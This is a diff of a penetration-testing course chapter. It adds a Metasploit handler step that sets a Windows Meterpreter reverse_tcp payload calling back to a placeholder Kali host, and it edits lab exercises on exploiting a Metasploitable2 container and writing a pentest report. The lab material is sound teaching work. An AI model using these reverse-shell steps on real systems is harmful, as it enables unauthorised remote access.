@@ -524,7 +524,11 @@ I highly recommend navigating to Juliosarfort's GitHub repository public-pentest
 > set LHOST KALI_IP
 > set LPORT 9001
 > ```
-> Set the payload of the handler to the Windows x64 staged Meterpreter TCP setting we used when generating the EXE using Msfvenom.  Double check the settings and confirm the payload, LHOST, and LPORT are correct.
+> Set the payload of the handler to the Windows x64 staged Meterpreter TCP setting we used when generating the EXE using Msfvenom.  
+> ```
+> set payload windows/x64/meterpreter/reverse_tcp
+> ```
+> Double check the settings and confirm the payload, LHOST, and LPORT are correct.
 > ```
 > options
 > ```
@@ -549,7 +553,10 @@ I highly recommend navigating to Juliosarfort's GitHub repository public-pentest
 > ```
 > sysinfo
 > ```
-> If your session dies, rerun the handler and re-execute the runme.exe on the victim to reestablish a connection. Using the help menu, identify a command that looks interesting and run it. Describe the command and if you were successful running it.
+> >[!warning] Warning - Session Death
+> >If your session dies, rerun the handler and re-execute the runme.exe on the victim to reestablish a connection. 
+>
+> Using the help menu, identify a command that looks interesting and run it. Describe the command and if you were successful running it.
 
 >[!exercise] Exercise 10.3 - Metasploitable2
 >In this task you will set up a local docker container running Metasploitable2 and perform a penetration test against it. This black box scope starts at the enumeration through exploitation phases - reconnaissance and post exploitation phases are not required.
@@ -628,6 +635,6 @@ I highly recommend navigating to Juliosarfort's GitHub repository public-pentest
 >```
 
 >[!exercise] Exercise 10.4 - Penetration Test
->In this task, you will build on your penetration test from the previous task.  You MUST find two additional vulnerabilities and attempt to exploit them.  Regardless of success, you must document the VSFTPD vulnerabilities AND the two vulnerabilities you identify in a penetration report.  You may use any general format for the report, but it MUST include a background, summary, and findings sections.  Each finding in the report MUST include a description, severity/impact, proof of concept/demonstration, and remediation recommendations.  Consider referencing a sample from [https://github.com/juliocesarfort/public-pentesting-reports](https://github.com/juliocesarfort/public-pentesting-reports) to guide the format of your professional report.
+>In this task, you will build on your penetration test from the previous task.  You MUST find two additional vulnerabilities on the Metasploitable2 victim and attempt to exploit them.  Regardless of success, you must document the VSFTPD vulnerabilities AND the two vulnerabilities you identify in a penetration report.  You may use any general format for the report, but it MUST include a background, summary, and findings sections.  Each finding in the report MUST include a description, severity/impact, proof of concept/demonstration with screenshots, and remediation recommendations.  Consider referencing a sample from [https://github.com/juliocesarfort/public-pentesting-reports](https://github.com/juliocesarfort/public-pentesting-reports) to guide the format of your professional report.
 
 [^1]: Missouri gov. calls journalist who found security flaw a “hacker,” threatens to sue - Ars Technica; Oct 14th, 2021; https://arstechnica.com/tech-policy/2021/10/missouri-gov-calls-journalist-who-found-security-flaw-a-hacker-threatens-to-sue/
